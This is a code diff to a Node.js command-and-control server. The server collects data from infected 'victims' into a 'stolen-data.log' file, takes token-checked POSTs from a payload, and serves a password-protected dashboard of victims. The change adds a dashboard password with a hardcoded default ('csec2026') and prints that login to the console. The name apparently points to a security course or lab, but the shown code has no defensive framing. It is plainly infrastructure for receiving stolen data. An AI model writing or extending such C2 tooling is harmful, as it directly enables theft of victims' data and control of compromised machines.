@@ -4,6 +4,7 @@ const path = require('path');
 
 const PORT = process.env.PORT || process.env.C2_PORT || 4444;
 const C2_SECRET = process.env.C2_SECRET || '';
+const DASH_PASS = process.env.DASH_PASS || 'csec2026';
 const LOG = path.join(__dirname, 'stolen-data.log');
 
 const R = '\x1b[31m', G = '\x1b[32m', Y = '\x1b[33m', C = '\x1b[36m', B = '\x1b[1m', D = '\x1b[2m', X = '\x1b[0m';
@@ -13,12 +14,11 @@ let victims = [];
 console.log(`\n${R}${B}  ╔═══════════════════════════════════════════════╗`);
 console.log(`  ║       C2 SERVER — LISTENING ON PORT ${PORT}        ║`);
 console.log(`  ╚═══════════════════════════════════════════════╝${X}\n`);
+console.log(`${G}  [+] Dashboard login:${X} admin / ${DASH_PASS}`);
 if (C2_SECRET) {
-  console.log(`${G}  [+] Token auth ENABLED${X} — only payload with matching token can POST`);
-  console.log(`${G}  [+] Dashboard login:${X} admin / <C2_SECRET value>`);
+  console.log(`${G}  [+] Payload auth ENABLED${X} — only matching X-Token can POST`);
 } else {
-  console.log(`${Y}  [!] NO PROTECTION${X} — anyone can POST and view dashboard`);
-  console.log(`${Y}      Set C2_SECRET env var to lock it down${X}`);
+  console.log(`${Y}  [!] Payload auth OFF${X} — set C2_SECRET env var to restrict POSTs`);
 }
 console.log(`${D}  Dashboard: http://localhost:${PORT}${X}`);
 console.log(`${D}  Reset:     POST /reset (clears all victims)${X}`);
@@ -80,13 +80,13 @@ http.createServer((req, res) => {
   }
 
   if (req.url === '/api/victims') {
-    if (C2_SECRET && !checkDashAuth(req)) { res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="C2"' }).end('Unauthorized'); return; }
+    if (!checkDashAuth(req)) { res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="C2"' }).end('Unauthorized'); return; }
     res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' }).end(JSON.stringify(victims));
     return;
   }
 
   if (req.url === '/' && req.method === 'GET') {
-    if (C2_SECRET && !checkDashAuth(req)) { res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="C2"' }).end('Unauthorized'); return; }
+    if (!checkDashAuth(req)) { res.writeHead(401, { 'WWW-Authenticate': 'Basic realm="C2"' }).end('Unauthorized'); return; }
     res.writeHead(200, { 'Content-Type': 'text/html' }).end(dashboard());
     return;
   }
@@ -98,7 +98,7 @@ function checkDashAuth(req) {
   const auth = req.headers.authorization;
   if (!auth || !auth.startsWith('Basic ')) return false;
   const decoded = Buffer.from(auth.slice(6), 'base64').toString();
-  return decoded === 'admin:' + C2_SECRET;
+  return decoded === 'admin:' + DASH_PASS;
 }
 
 function dashboard() {
